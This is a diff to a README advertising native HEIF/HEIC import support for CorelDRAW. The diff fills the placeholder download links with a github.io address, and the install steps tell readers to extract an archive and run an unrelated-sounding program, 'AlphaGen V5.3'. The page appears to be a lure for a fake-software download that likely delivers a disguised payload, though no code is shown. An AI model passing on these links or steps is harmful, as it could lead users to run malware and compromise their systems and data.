@@ -2,13 +2,13 @@
 
 Import and edit HEIF and HEIC image formats natively in CorelDRAW — full support for modern high-efficiency media captured on mobile devices.
 
-[![Download](https://img.shields.io/badge/Download-HEIF_HEIC_Support-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-HEIF_HEIC_Support-blueviolet)](https://heif-heic-file-support-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://heif-heic-file-support-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to enable format support  
 4. ✅ Open CorelDRAW and import `.heic` or `.heif` files directly using `File > Import`
